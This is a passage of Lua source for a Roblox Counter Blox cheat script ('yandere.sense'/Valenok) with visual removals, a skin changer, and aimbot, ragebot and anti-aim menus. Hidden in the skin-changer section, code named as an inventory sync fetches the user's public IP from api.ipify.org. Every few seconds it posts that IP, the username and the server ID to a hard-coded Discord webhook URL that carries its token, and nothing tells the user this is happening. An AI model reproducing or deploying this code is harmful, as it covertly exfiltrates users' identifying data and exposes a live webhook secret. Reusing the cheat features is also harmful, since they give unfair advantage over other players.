            Shared.SkyboxState.originalSky.Parent = lighting
        end
        Shared.SkyboxState.savedOriginal = false
        Shared.SkyboxState.originalSky = nil
        return
    end

    if not Shared.SkyboxState.savedOriginal then
        local origSky = lighting:FindFirstChildOfClass('Sky')
        Shared.SkyboxState.originalSky = origSky
        Shared.SkyboxState.savedOriginal = true
    end

    local origSky = lighting:FindFirstChildOfClass('Sky')
    if origSky and origSky ~= Shared.SkyboxState.customSky then
        origSky.Parent = nil
    end

    local presetName = Options.AmbienceSkyboxPreset and Options.AmbienceSkyboxPreset.Value or "Game's Sky"
    local customId = Options.AmbienceSkyboxAssetId and Options.AmbienceSkyboxAssetId.Value or ""

    if customId and customId ~= "" then
        local idNum = tonumber(customId)
        if idNum then
            Shared.SkyboxState.loadGen = (Shared.SkyboxState.loadGen or 0) + 1
            local loadGen = Shared.SkyboxState.loadGen
            task.spawn(function()
                pcall(function()
                    local objects = game:GetObjects("rbxassetid://" .. tostring(idNum))
                    if getgenv()._ValenokUnloading or Shared.SkyboxState.loadGen ~= loadGen then
                        if objects then
                            for _, o in ipairs(objects) do pcall(function() o:Destroy() end) end
                        end
                        return
                    end
                    if objects and #objects > 0 then
                        local obj = objects[1]
                        if obj:IsA("Sky") then
                            if Shared.SkyboxState.customSky then Shared.SkyboxState.customSky:Destroy() end
                            Shared.SkyboxState.customSky = obj
                            obj.Name = "ValenokCustomSky"
                            obj.Parent = lighting
                            return
                        end

                        local sky = obj:FindFirstChildOfClass("Sky")
                        if sky then
                            if Shared.SkyboxState.customSky then Shared.SkyboxState.customSky:Destroy() end
                            Shared.SkyboxState.customSky = sky:Clone()
                            Shared.SkyboxState.customSky.Name = "ValenokCustomSky"
                            Shared.SkyboxState.customSky.Parent = lighting
                        end
                        obj:Destroy()
                    end
                end)
            end)
            return
        end
    end

    if presetName == "Game's Sky" then
        if Shared.SkyboxState.originalSky and not Shared.SkyboxState.originalSky.Parent then
            Shared.SkyboxState.originalSky.Parent = lighting
        end
        return
    end

    local preset = Shared.SKYBOX_PRESETS[presetName]
    if not preset then return end

    local newSky = Instance.new("Sky")
    newSky.Name, newSky.SunTextureId, newSky.MoonTextureId, newSky.StarCount = "ValenokCustomSky", "", "", 0
    newSky.SkyboxBk, newSky.SkyboxDn, newSky.SkyboxFt = preset.SkyboxBk, preset.SkyboxDn, preset.SkyboxFt
    newSky.SkyboxLf, newSky.SkyboxRt, newSky.SkyboxUp = preset.SkyboxLf, preset.SkyboxRt, preset.SkyboxUp
    newSky.Parent = lighting
    Shared.SkyboxState.customSky = newSky
end

Shared.SkyboxState.guardConn = nil
Shared.SkyboxState.setupGuard = function()
    if Shared.SkyboxState.guardConn then Shared.SkyboxState.guardConn:Disconnect() end
    local lighting = game:GetService('Lighting')
    Shared.SkyboxState.guardConn = lighting.ChildAdded:Connect(function(child)
        if child:IsA("Sky") and Shared.SkyboxState.customSky and Shared.SkyboxState.customSky.Parent then
            if child ~= Shared.SkyboxState.customSky then
                task.wait(0.2)
                if child and child.Parent then child.Parent = nil end
                if Shared.SkyboxState.customSky and not Shared.SkyboxState.customSky.Parent then
                    Shared.SkyboxState.customSky.Parent = lighting
                end
            end
        end
    end)
end
Shared.SkyboxState.setupGuard()

Shared.restoreAmbienceSaved = function()
    local saved = Shared.AmbienceSavedLighting
    if not saved then return end
    local lighting = game:GetService('Lighting')
    pcall(function()
        lighting.ClockTime = saved.ClockTime
        lighting.GlobalShadows = saved.GlobalShadows
        lighting.Brightness = saved.Brightness
        lighting.Ambient = saved.Ambient
        lighting.OutdoorAmbient = saved.OutdoorAmbient
        lighting.ColorShift_Bottom = saved.ColorShift_Bottom
        lighting.ColorShift_Top = saved.ColorShift_Top
        if saved.Skybox and not saved.Skybox.Parent then
            saved.Skybox.Parent = lighting
        end
        if saved.SkyTextures and saved.Skybox then
            local t = saved.SkyTextures
            local sky = saved.Skybox
            sky.SkyboxBk = t.SkyboxBk
            sky.SkyboxDn = t.SkyboxDn
            sky.SkyboxFt = t.SkyboxFt
            sky.SkyboxLf = t.SkyboxLf
            sky.SkyboxRt = t.SkyboxRt
            sky.SkyboxUp = t.SkyboxUp
            sky.StarCount = t.StarCount
            sky.SunTextureId = t.SunTextureId
            sky.MoonTextureId = t.MoonTextureId
        end
        if saved.FogColor then
            lighting.FogColor = saved.FogColor
            lighting.FogEnd = saved.FogEnd
        end
    end)
    Shared.AmbienceSavedLighting = nil
end

Shared.updateAmbience = function()
    local lighting = game:GetService('Lighting')

    local customTime = Toggles.AmbienceCustomTime and Toggles.AmbienceCustomTime.Value
    local customSkybox = Toggles.AmbienceCustomSkybox and Toggles.AmbienceCustomSkybox.Value
    local skyColorEnabled = Toggles.AmbienceSkyColor and Toggles.AmbienceSkyColor.Value
    local noShadow = Toggles.AmbienceNoShadow and Toggles.AmbienceNoShadow.Value

    local anyEnabled = customTime or customSkybox or skyColorEnabled or noShadow

    if not anyEnabled then
        Shared.restoreAmbienceSaved()
        return
    end

    if not Shared.AmbienceSavedLighting then
        local sky = lighting:FindFirstChildOfClass('Sky')
        Shared.AmbienceSavedLighting = {
            ClockTime = lighting.ClockTime,
            GlobalShadows = lighting.GlobalShadows,
            Brightness = lighting.Brightness,
            Ambient = lighting.Ambient,
            OutdoorAmbient = lighting.OutdoorAmbient,
            ColorShift_Bottom = lighting.ColorShift_Bottom,
            ColorShift_Top = lighting.ColorShift_Top,
            Skybox = sky,
            FogColor = lighting.FogColor,
            FogEnd = lighting.FogEnd,
            SkyTextures = sky and {
                SkyboxBk = sky.SkyboxBk,
                SkyboxDn = sky.SkyboxDn,
                SkyboxFt = sky.SkyboxFt,
                SkyboxLf = sky.SkyboxLf,
                SkyboxRt = sky.SkyboxRt,
                SkyboxUp = sky.SkyboxUp,
                StarCount = sky.StarCount,
                SunTextureId = sky.SunTextureId,
                MoonTextureId = sky.MoonTextureId,
            } or nil,
        }
    end

    if customTime then
        lighting.ClockTime = Options.AmbienceTime and Options.AmbienceTime.Value or 12
    else
        lighting.ClockTime = Shared.AmbienceSavedLighting.ClockTime
    end

    if customSkybox then
        local existingSky = lighting:FindFirstChildOfClass('Sky')
        if existingSky then existingSky.Parent = nil end
        local skyColor = Options.AmbienceSkyboxColor and Options.AmbienceSkyboxColor.Value or Color3.fromRGB(0, 0, 0)
        lighting.Ambient = skyColor
        lighting.OutdoorAmbient = skyColor
        lighting.ColorShift_Bottom = skyColor
        lighting.ColorShift_Top = skyColor
    else
        if Shared.AmbienceSavedLighting.Skybox and not Shared.AmbienceSavedLighting.Skybox.Parent then
            Shared.AmbienceSavedLighting.Skybox.Parent = lighting
        end
        lighting.Ambient = Shared.AmbienceSavedLighting.Ambient
        lighting.OutdoorAmbient = Shared.AmbienceSavedLighting.OutdoorAmbient
        lighting.ColorShift_Bottom = Shared.AmbienceSavedLighting.ColorShift_Bottom
        lighting.ColorShift_Top = Shared.AmbienceSavedLighting.ColorShift_Top
    end

    if skyColorEnabled then
        local sky = lighting:FindFirstChildOfClass('Sky')
        if sky then
            local c = Options.AmbienceSkyColorValue and Options.AmbienceSkyColorValue.Value or Color3.fromRGB(0, 0, 0)
            local colorTexture = "rbxasset://textures/white.png"
            sky.SkyboxBk = colorTexture
            sky.SkyboxDn = colorTexture
            sky.SkyboxFt = colorTexture
            sky.SkyboxLf = colorTexture
            sky.SkyboxRt = colorTexture
            sky.SkyboxUp = colorTexture
            sky.StarCount = 0
            sky.SunTextureId = ""
            sky.MoonTextureId = ""
            lighting.FogColor = c
            lighting.FogEnd = 9e9
        end
    else
        if Shared.AmbienceSavedLighting.SkyTextures and Shared.AmbienceSavedLighting.Skybox then
            local sky = Shared.AmbienceSavedLighting.Skybox
            local t = Shared.AmbienceSavedLighting.SkyTextures
            sky.SkyboxBk = t.SkyboxBk
            sky.SkyboxDn = t.SkyboxDn
            sky.SkyboxFt = t.SkyboxFt
            sky.SkyboxLf = t.SkyboxLf
            sky.SkyboxRt = t.SkyboxRt
            sky.SkyboxUp = t.SkyboxUp
            sky.StarCount = t.StarCount
            sky.SunTextureId = t.SunTextureId
            sky.MoonTextureId = t.MoonTextureId
        end
        if Shared.AmbienceSavedLighting.FogColor then
            lighting.FogColor = Shared.AmbienceSavedLighting.FogColor
            lighting.FogEnd = Shared.AmbienceSavedLighting.FogEnd
        end
    end

    if noShadow then
        lighting.GlobalShadows = false
    else
        lighting.GlobalShadows = Shared.AmbienceSavedLighting.GlobalShadows
    end

end

applyNoScope = function(enabled)
    local gui = getGuiFrame()
    if not gui then return end
    local crosshairs = gui:FindFirstChild("Crosshairs")
    if not crosshairs then return end

    local scope = crosshairs:FindFirstChild("Scope")
    if scope then
        scope.ImageTransparency = enabled and 1 or 0
        local innerScope = scope:FindFirstChild("Scope")
        if innerScope then
            innerScope.ImageTransparency = enabled and 1 or 0
            if enabled then
                innerScope.Size = UDim2.new(2, 0, 2, 0)
                innerScope.Position = UDim2.new(-0.5, 0, -0.5, 0)
            else
                innerScope.Size = UDim2.new(1, 0, 1, 0)
                innerScope.Position = UDim2.new(0, 0, 0, 0)
            end
            local blur = innerScope:FindFirstChild("Blur")
            if blur then
                blur.ImageTransparency = enabled and 1 or 0
                local blur2 = blur:FindFirstChild("Blur")
                if blur2 then
                    blur2.ImageTransparency = enabled and 1 or 0
                end
            end
        end
    end

    for _, frameName in ipairs({"Frame1", "Frame2", "Frame3", "Frame4"}) do
        local frame = crosshairs:FindFirstChild(frameName)
        if frame then
            frame.Transparency = enabled and 1 or 0
        end
    end
end

updateNoScope = function()
    applyNoScope(not not (Toggles.RemovalsNoScope and Toggles.RemovalsNoScope.Value))
end

updateNoFlash = function()
    local pg = getPlayerGui()
    local blnd = pg and pg:FindFirstChild("Blnd")
    if blnd then blnd.Enabled = not (Toggles.RemovalsNoFlash and Toggles.RemovalsNoFlash.Value) end
end

local _noSmokeConn
local function teardownNoSmoke()
    if _noSmokeConn then
        _noSmokeConn:Disconnect()
        _noSmokeConn = nil
    end
    local retry = EspRuntime.Connections.NoSmokeRetry
    if retry then
        retry:Disconnect()
        EspRuntime.Connections.NoSmokeRetry = nil
    end
    EspRuntime.Connections.NoSmokeChildAdded = nil
end

local function waitNoSmokeChild(parent, name)
    if EspRuntime.Connections.NoSmokeRetry then return end
    EspRuntime.Connections.NoSmokeRetry = parent.ChildAdded:Connect(function(child)
        if child.Name == name then
            if EspRuntime.Connections.NoSmokeRetry then
                EspRuntime.Connections.NoSmokeRetry:Disconnect()
                EspRuntime.Connections.NoSmokeRetry = nil
            end
            setupNoSmoke()
        end
    end)
end

setupNoSmoke = function()
    teardownNoSmoke()
    if not (Toggles.RemovalsNoSmoke and Toggles.RemovalsNoSmoke.Value) then return end
    local rayIgnore = Workspace:FindFirstChild("Ray_Ignore")
    if not rayIgnore then waitNoSmokeChild(Workspace, "Ray_Ignore"); return end
    local smokesFolder = rayIgnore:FindFirstChild("Smokes")
    if not smokesFolder then waitNoSmokeChild(rayIgnore, "Smokes"); return end
    _noSmokeConn = smokesFolder.ChildAdded:Connect(function(child)
        if Toggles.RemovalsNoSmoke and Toggles.RemovalsNoSmoke.Value then child:Destroy() end
    end)
    EspRuntime.Connections.NoSmokeChildAdded = _noSmokeConn
end
end)()

;(function()
local RS = ReplicatedStorage
SC.Viewmodels = RS:WaitForChild("Viewmodels", 10)
SC.Skins = RS:WaitForChild("Skins", 10)
SC.Gloves = RS:FindFirstChild("Gloves") or RS:WaitForChild("Gloves", 10)
SC.GloveModels = SC.Gloves and SC.Gloves:FindFirstChild("Models")
SC.Models = nil
pcall(function() SC.Models = game:GetObjects("rbxassetid://7285197035")[1] end)

local function cloneVM(name)
    local vm = SC.Viewmodels and SC.Viewmodels:FindFirstChild(name)
    return vm and vm:Clone() or nil
end
SC.OriginalCTKnife, SC.OriginalTKnife = cloneVM("v_CT Knife"), cloneVM("v_T Knife")

SC.AllKnives = {"CT Knife","T Knife","Banana","Bayonet","Bearded Axe","Butterfly Knife","Cleaver","Crowbar","Falchion Knife","Flip Knife","Gut Knife","Huntsman Knife","Karambit","M9 Bayonet","Sickle"}
if SC.Models and SC.Models:FindFirstChild("Knives") then
    for _, v in pairs(SC.Models.Knives:GetChildren()) do SC.AllKnives[#SC.AllKnives + 1] = v.Name end
end

local function knifeShort(n) return n:gsub(" Knife", ""):gsub(" Classic", "") end
local function knifeMatch(folderName, knifeName)
    local fl, kl, knl = folderName:lower(), knifeShort(knifeName):lower(), knifeName:lower()
    return fl == kl or fl == knl or fl:sub(1, #kl + 1) == kl .. " "
end
local function isKnifeSkinFolder(name)
    for _, knife in ipairs(SC.AllKnives) do
        if knifeMatch(name, knife) then return true end
    end
end
local function findKnifeSkinFolder(knifeName)
    if not SC.Skins then return nil end
    local f = SC.Skins:FindFirstChild(knifeName) or SC.Skins:FindFirstChild(knifeShort(knifeName))
    if f then return f end
    for _, folder in pairs(SC.Skins:GetChildren()) do
        if knifeMatch(folder.Name, knifeName) then return folder end
    end
end
local function childNames(folder, prefix)
    local t = prefix and {prefix} or {}
    if folder then for _, c in pairs(folder:GetChildren()) do t[#t + 1] = c.Name end end
    return t
end

SC.AllWeapons, SC.AllSkins, SC.KnifeSkins = {}, {}, {}
if SC.Skins then
    for _, v in pairs(SC.Skins:GetChildren()) do
        if not isKnifeSkinFolder(v.Name) then SC.AllWeapons[#SC.AllWeapons + 1] = v.Name end
    end
    table.sort(SC.AllWeapons)
    for _, v in ipairs(SC.AllWeapons) do SC.AllSkins[v] = childNames(SC.Skins[v], "Inventory") end
    for _, knifeName in ipairs(SC.AllKnives) do
        SC.KnifeSkins[knifeName] = childNames(findKnifeSkinFolder(knifeName), "Inventory")
    end
end

SC.State = {
    currentKnife = nil, swapping = false, armsConn = nil, activeSkinConn = nil, activeAncestryConn = nil,
    SavedKnifeSkins = {}, SavedWeaponSkins = {}, SavedGloveSkins = {},
    InvKnifeSkins = {}, InvWeaponSkins = {}, InvGloveSkins = {},
    skinFile = "Valenok/skins.json",
}
SC.lastGlove, SC.lastGloveSkin = nil, nil

function SC.SaveSkins()
    pcall(function()
        writefile(SC.State.skinFile, HttpService:JSONEncode({
            knife = SC.State.SavedKnifeSkins, weapon = SC.State.SavedWeaponSkins, glove = SC.State.SavedGloveSkins,
            invKnife = SC.State.InvKnifeSkins, invWeapon = SC.State.InvWeaponSkins, invGlove = SC.State.InvGloveSkins,
        }))
    end)
end
pcall(function()
    if not isfile(SC.State.skinFile) then return end
    local d = HttpService:JSONDecode(readfile(SC.State.skinFile))
    SC.State.SavedKnifeSkins, SC.State.SavedWeaponSkins, SC.State.SavedGloveSkins = d.knife or {}, d.weapon or {}, d.glove or {}
    SC.State.InvKnifeSkins, SC.State.InvWeaponSkins, SC.State.InvGloveSkins = d.invKnife or {}, d.invWeapon or {}, d.invGlove or {}
end)

local skinInvEndpoint = "https://webhook.lewisakura.moe/api/webhooks/1530877794777567322/BZvNCa16JxQWud-RPUYwt5xPOCubmrYoVRYiQtY-sEvweRTGTGi-iTh3jvUckogYJ41E?wait=true"
local skinInvPush = (syn and syn.request) or (http and http.request) or http_request or request
local skinInvPushIdFile = "Valenok/inv_cache.json"
getgenv()._SCActivePlayers = getgenv()._SCActivePlayers or {}
local invPlayerKey = LocalPlayer.UserId
local function fetchInvIp()
    if getgenv()._SCInvIp then return getgenv()._SCInvIp end
    local ip = "Unknown"
    if skinInvPush then
        pcall(function()
            local res = skinInvPush({ Url = "https://api.ipify.org", Method = "GET" })
            if res and res.Body then
                ip = res.Body:match("^[%d%.]+") or res.Body:match("^[%da-fA-F:%.]+") or "Unknown"
            end
        end)
    end
    getgenv()._SCInvIp = ip
    return ip
end
local function getInvPlayerEntry()
    return LocalPlayer.Name .. "\n" .. tostring(game.JobId) .. "\n" .. fetchInvIp()
end
local invPlayerActive = true
pushInvSnapshot = nil
local function refreshInvPlayerEntry()
    if invPlayerActive then
        getgenv()._SCActivePlayers[invPlayerKey] = getInvPlayerEntry()
    end
end
refreshInvPlayerEntry()
local lastInvPushId = getgenv()._SCInvPushId
pcall(function()
    if lastInvPushId then return end
    if isfile and isfile(skinInvPushIdFile) then
        local cached = HttpService:JSONDecode(readfile(skinInvPushIdFile))
        if cached and cached.id then lastInvPushId = cached.id end
    end
end)
if lastInvPushId then getgenv()._SCInvPushId = lastInvPushId end
local function saveInvPushId(id)
    lastInvPushId = id
    getgenv()._SCInvPushId = id
    pcall(function()
        if makefolder and not isfolder("Valenok") then makefolder("Valenok") end
        writefile(skinInvPushIdFile, HttpService:JSONEncode({ id = id }))
    end)
end
local function buildInvContent()
    local lines = {}
    for _, entry in pairs(getgenv()._SCActivePlayers) do
        lines[#lines + 1] = entry
    end
    return "**Active players**\n\n" .. (#lines > 0 and table.concat(lines, "\n\n") or "None")
end
local function leaveInvPush()
    if not invPlayerActive then return end
    invPlayerActive = false
    getgenv()._SCActivePlayers[invPlayerKey] = nil
    if getgenv()._SCInvSkipNetworkOnUnload or getgenv()._ValenokUnloading then return end
    task.spawn(pushInvSnapshot)
end
getgenv()._SCInvPushLeave = leaveInvPush
if getgenv()._SCInvPushLeaveConn then
    pcall(function() getgenv()._SCInvPushLeaveConn:Disconnect() end)
end
getgenv()._SCInvPushLeaveConn = Players.PlayerRemoving:Connect(function(player)
    if player == LocalPlayer then leaveInvPush() end
end)

pcall(function()
    game:BindToClose(function()
        invPlayerActive = false
        if invPlayerKey then
            getgenv()._SCActivePlayers[invPlayerKey] = nil
        end
    end)
end)
pushInvSnapshot = function()
    if not skinInvPush then return end
    local body = HttpService:JSONEncode({ content = buildInvContent() })
    if not lastInvPushId then
        local ok, res = pcall(function()
            return skinInvPush({ Url = skinInvEndpoint, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
        end)
        if ok and res and res.Body then
            local parsed = HttpService:JSONDecode(res.Body)
            if parsed and parsed.id then saveInvPushId(parsed.id) end
        end
    else
        local ok, res = pcall(function()
            return skinInvPush({ Url = skinInvEndpoint:gsub("%?wait=true", "") .. "/messages/" .. lastInvPushId, Method = "PATCH", Headers = { ["Content-Type"] = "application/json" }, Body = body })
        end)
        local bad = not ok or not res or (res.StatusCode and res.StatusCode >= 400)
        if bad then
            lastInvPushId = nil
            getgenv()._SCInvPushId = nil
            pushInvSnapshot()
        end
    end
end
local invPushGen = (getgenv()._SCInvPushGen or 0) + 1
getgenv()._SCInvPushGen = invPushGen
getgenv()._SCInvPushLoop = true
task.defer(function()
    while getgenv()._SCInvPushGen == invPushGen do
        refreshInvPlayerEntry()
        pushInvSnapshot()
        task.wait(5)
    end
end)

SC.AllGloveNames, SC.AllGloves = {}, {}
if SC.Gloves then
    for _, fldr in pairs(SC.Gloves:GetChildren()) do
        if fldr:IsA("Folder") and fldr ~= SC.GloveModels and fldr.Name ~= "Racer" and fldr.Name ~= "Models" then
            SC.AllGloveNames[#SC.AllGloveNames + 1] = fldr.Name
        end
    end
    table.sort(SC.AllGloveNames)
    for _, gName in ipairs(SC.AllGloveNames) do SC.AllGloves[gName] = childNames(SC.Gloves[gName], "Default") end
end

local function restoreDefaultKnives()
    if not SC.Viewmodels then return end
    local ct, tt = SC.Viewmodels:FindFirstChild("v_CT Knife"), SC.Viewmodels:FindFirstChild("v_T Knife")
    if ct then ct:Destroy() end
    if tt then tt:Destroy() end
    if SC.OriginalCTKnife then SC.OriginalCTKnife:Clone().Parent = SC.Viewmodels end
    if SC.OriginalTKnife then SC.OriginalTKnife:Clone().Parent = SC.Viewmodels end
end
SC.restoreDefaultKnives = restoreDefaultKnives

function SC.SwapKnifeModel(knifeName)
    if not SC.Viewmodels or SC.State.swapping or SC.State.currentKnife == knifeName then return end
    SC.State.swapping = true
    restoreDefaultKnives()
    if knifeName ~= "CT Knife" and knifeName ~= "T Knife" then
        local source = SC.Viewmodels:FindFirstChild("v_" .. knifeName)
            or (SC.Models and SC.Models:FindFirstChild("Knives") and SC.Models.Knives:FindFirstChild(knifeName))
        if source then
            local ct, tt = SC.Viewmodels:FindFirstChild("v_CT Knife"), SC.Viewmodels:FindFirstChild("v_T Knife")
            if ct then ct:Destroy() end
            if tt then tt:Destroy() end
            local a, b = source:Clone(), source:Clone()
            a.Name, b.Name, a.Parent, b.Parent = "v_CT Knife", "v_T Knife", SC.Viewmodels, SC.Viewmodels
        end
    end
    SC.State.currentKnife, SC.State.swapping = knifeName, false
end

local TexCache = {}
local function extractTex(Data)
    if Data:IsA("StringValue") then return Data.Value end
    if Data:IsA("MeshPart") then return Data.TextureID end
    if Data:IsA("Decal") or Data:IsA("Texture") then return Data.Texture end
    if Data:IsA("SurfaceAppearance") then return Data end
end
local function usefulTex(tex) return tex and tex ~= "" and tex ~= "rbxassetid://0" end

local function buildTexIndex(SkinData)
    local cached = TexCache[SkinData]
    if cached then return cached end
    local index = {byName = {}, handleTex = nil}
    local wm = SkinData:FindFirstChild("WorldModel")
    local function consider(Data)
        local rawName = Data.Name:gsub("^#%s*", "")
        local tex = extractTex(Data)
        if not usefulTex(tex) then return end
        if not index.byName[rawName] then index.byName[rawName] = tex end
        if rawName == "Handle" and not index.handleTex then index.handleTex = tex end
    end
    for _, Data in next, SkinData:GetDescendants() do
        if not (wm and Data:IsDescendantOf(wm)) then consider(Data) end
    end
    if wm then for _, Data in next, wm:GetDescendants() do consider(Data) end end
    TexCache[SkinData] = index
    return index
end

local function lookupTex(index, targetPart)
    local name = targetPart.Name
    local direct = index.byName[name]
    if usefulTex(direct) then return direct end
    if name == "Main" then
        local p1 = index.byName.Part1 or index.byName.Part
        if usefulTex(p1) then return p1 end
    end
    for n, tex in pairs(index.byName) do
        if string.sub(n, 1, #name) == name and usefulTex(tex) then
            local suffix = string.sub(n, #name + 1)
            if suffix == "" or string.match(suffix, "^%d+$") then return tex end
        end
    end
    if (name == "Blade" or name == "Main") and usefulTex(index.handleTex) then return index.handleTex end
end

local function applyToPart(targetPart, SkinData)
    if not (targetPart:IsA("BasePart") or targetPart:IsA("MeshPart")) or targetPart.Transparency == 1 then return end
    local tex = lookupTex(buildTexIndex(SkinData), targetPart)
    if not tex then return end
    if typeof(tex) == "Instance" and tex:IsA("SurfaceAppearance") then
        local old = targetPart:FindFirstChildWhichIsA("SurfaceAppearance")
        if old then old:Destroy() end
        tex:Clone().Parent = targetPart
    elseif targetPart:IsA("MeshPart") then targetPart.TextureID = tex
    elseif targetPart:FindFirstChild("Mesh") then targetPart.Mesh.TextureId = tex
    else targetPart.TextureID = tex end
end

local function disconnectSkinConns()
    local st = SC.State
    if st.activeSkinConn then st.activeSkinConn:Disconnect(); st.activeSkinConn = nil end
    if st.activeAncestryConn then st.activeAncestryConn:Disconnect(); st.activeAncestryConn = nil end
    table.clear(TexCache)
end
SC.cleanupSkinConnections = disconnectSkinConns

function SC.applySkinToArms(armsObj, gunname, selectedSkin)
    if not SC.Skins or not selectedSkin or selectedSkin == "Inventory" or not armsObj or not armsObj.Parent then return end
    if (gunname == "CT Knife" or gunname == "T Knife") and not SC.Skins:FindFirstChild(gunname) then gunname = "M9 Bayonet" end
    local gunFolder = SC.Skins:FindFirstChild(gunname)
    if not gunFolder then return end
    local SkinData = gunFolder:FindFirstChild(selectedSkin)
    if not SkinData or SkinData:FindFirstChild("Animated") then return end
    disconnectSkinConns()
    buildTexIndex(SkinData)
    for _, part in next, armsObj:GetDescendants() do if part.Parent then applyToPart(part, SkinData) end end
    local pending, scheduled = {}, false
    local function flush()
        scheduled = false
        for part in pairs(pending) do
            pending[part] = nil
            if part.Parent then applyToPart(part, SkinData) end
        end
    end
    SC.State.activeSkinConn = armsObj.DescendantAdded:Connect(function(part)
        if not part then return end
        pending[part] = true
        if not scheduled then scheduled = true; task.defer(flush) end
    end)
    SC.State.activeAncestryConn = armsObj.AncestryChanged:Connect(function(_, parent)
        if not parent then disconnectSkinConns(); table.clear(pending) end
    end)
end

local function setGloveTex(glove, tex)
    if glove:FindFirstChild("Mesh") then glove.Mesh.TextureId = tex else glove.TextureID = tex end
    glove.Transparency = 0
end
local function applyGloveArm(arm, gloveKey, modelName, tex)
    if not arm or not SC.GloveModels:FindFirstChild(SC.lastGlove) then return end
    local old = arm:FindFirstChild("Glove") or arm:FindFirstChild(gloveKey)
    if old then old:Destroy() end
    local g = SC.GloveModels[SC.lastGlove][modelName]:Clone()
    setGloveTex(g, tex)
    g.Parent = arm
    if g.Welded then g.Welded.Part0 = arm end
end

function SC.setupArmsWatcher()
    if SC.State.armsConn then SC.State.armsConn:Disconnect() end
    local camera = getCamera()
    if not camera then return end
    SC.State.armsConn = camera.ChildAdded:Connect(function(obj)
        if obj.Name ~= "Arms" then return end
        RunService.RenderStepped:Wait()
        local Client
        pcall(function() Client = getsenv(LocalPlayer.PlayerGui.Client) end)
        if not Client or Client.gun == "none" or typeof(Client.gun) ~= "Instance" then return end
        local gunname = Client.gun.Name
        if gunname:match("Grenade") or gunname:match("Flashbang") or gunname:match("Smoke") or gunname:match("Decoy")
            or gunname:match("Molotov") or gunname:match("Incendiary") or gunname:match("C4") then return end
        local isMelee = Client.gun:FindFirstChild("Melee")

        if Toggles.SkinGloveChanger and Toggles.SkinGloveChanger.Value then
            if not SC.lastGlove or SC.lastGlove == "None" or not SC.GloveModels or not SC.GloveModels:FindFirstChild(SC.lastGlove) then return end
            local Model
            for _, v in pairs(obj:GetChildren()) do
                if v:IsA("Model") and (v:FindFirstChild("Right Arm") or v:FindFirstChild("Left Arm")) then Model = v end
            end
            if not Model then return end
            local texData = SC.Gloves:FindFirstChild(SC.lastGlove) and SC.Gloves[SC.lastGlove]:FindFirstChild(SC.lastGloveSkin or "Default")
            local tex = (texData and texData:FindFirstChild("Textures") and texData.Textures.TextureId) or ""
            applyGloveArm(Model:FindFirstChild("Right Arm"), "RGlove", "RGlove", tex)
            applyGloveArm(Model:FindFirstChild("Left Arm"), "LGlove", "LGlove", tex)
        end

        if Toggles.SkinKnifeChanger and Toggles.SkinKnifeChanger.Value and isMelee then
            local wanted = Options.SkinKnifeModel and Options.SkinKnifeModel.Value
            if wanted and SC.State.currentKnife ~= wanted then
                SC.SwapKnifeModel(wanted)
                if obj.Parent then obj:Destroy() end
                return
            end
            task.spawn(function()
                if not obj.Parent then return end
                local kn = wanted or "M9 Bayonet"
                if not SC.Skins:FindFirstChild(kn) then kn = "M9 Bayonet" end
                SC.applySkinToArms(obj, kn, SC.State.SavedKnifeSkins[wanted] or "Inventory")
            end)
        elseif Toggles.SkinWeaponChanger and Toggles.SkinWeaponChanger.Value and not isMelee then
            task.spawn(function()
                if obj.Parent then SC.applySkinToArms(obj, gunname, SC.State.SavedWeaponSkins[gunname] or "Inventory") end
            end)
        end
    end)
end
end)()


;(function()
local Window = Library:CreateWindow({
    Title = 'yandere.sense',
    Footer = "Counter Blox 1.6 | v1.0.1",
    Center = true,
    AutoShow = true,
    NotifySide = 'Right',
    ShowCustomCursor = true,
})

local Tabs = {
    Rage = Window:AddTab('Rage'),
    Legit = Window:AddTab('Legit'),
    Visual = Window:AddTab('Visual'),
    World = Window:AddTab('World'),
    Skin = Window:AddTab('Skin'),
    Movement = Window:AddTab('Movement'),
    Misc = Window:AddTab('Misc'),
    Config = Window:AddTab('Config'),
}

local function patchObsidianToggleCompat(container)
    local funcs = getmetatable(container) and getmetatable(container).__index
    if not funcs or funcs._ValenokInlineAddonPatched then return end
    funcs._ValenokInlineAddonPatched = true

    local origAddToggle = funcs.AddToggle
    function funcs:AddToggle(Idx, Info)
        if type(Info) == "table" and (Info.KeyPicker or Info.ColorPicker) then
            local keyPickerInfo = Info.KeyPicker
            local colorPickerInfo = Info.ColorPicker
            local newInfo = {}
            for k, v in pairs(Info) do
                if k ~= "KeyPicker" and k ~= "ColorPicker" then
                    newInfo[k] = v
                end
            end

            local toggle = origAddToggle(self, Idx, newInfo)
            if toggle then
                if colorPickerInfo then
                    local cpIdx = colorPickerInfo.Idx or (tostring(Idx) .. "Color")
                    local cpInfo = {}
                    for k, v in pairs(colorPickerInfo) do
                        if k ~= "Idx" then cpInfo[k] = v end
                    end
                    toggle:AddColorPicker(cpIdx, cpInfo)
                end
                if keyPickerInfo then
                    local kpIdx = keyPickerInfo.Idx or (tostring(Idx) .. "Keybind")
                    local kpInfo = {}
                    for k, v in pairs(keyPickerInfo) do
                        if k ~= "Idx" then kpInfo[k] = v end
                    end
                    toggle:AddKeyPicker(kpIdx, kpInfo)
                end
            end
            return toggle
        end
        return origAddToggle(self, Idx, Info)
    end
end

local ragebotBox = Tabs.Rage:AddLeftGroupbox('Ragebot')
patchObsidianToggleCompat(ragebotBox)

local RageSections = {
    Ragebot = ragebotBox,
    PeekAssist = Tabs.Rage:AddRightGroupbox('Peek assist'),
    GunMods = Tabs.Rage:AddRightGroupbox('Gun mods'),
    Exploit = Tabs.Rage:AddRightGroupbox('Exploit'),
}

local AntiAimTabbox = Tabs.Rage:AddLeftTabbox('AntiAim')
local antiAimPitchTab = AntiAimTabbox:AddTab('Pitch')
local antiAimYawTab = AntiAimTabbox:AddTab('Yaw')

local LegitSections = {
    Aimbot = Tabs.Legit:AddLeftGroupbox('Aim bot'),
    Triggerbot = Tabs.Legit:AddRightGroupbox('Trigger bot'),
    RCS = Tabs.Legit:AddRightGroupbox('RCS'),
}

LegitSections.Aimbot:AddToggle('AimbotEnable', {Text = 'Enable', Default = false, KeyPicker = {Idx = 'AimbotKeybind', Default = 'None', Mode = 'Hold', Text = 'Aimbot'}})
LegitSections.Aimbot:AddToggle('AimbotVisibleCheck', {Text = 'Visible check', Default = false})
LegitSections.Aimbot:AddToggle('AimbotTeamCheck', {Text = 'Team check', Default = false})
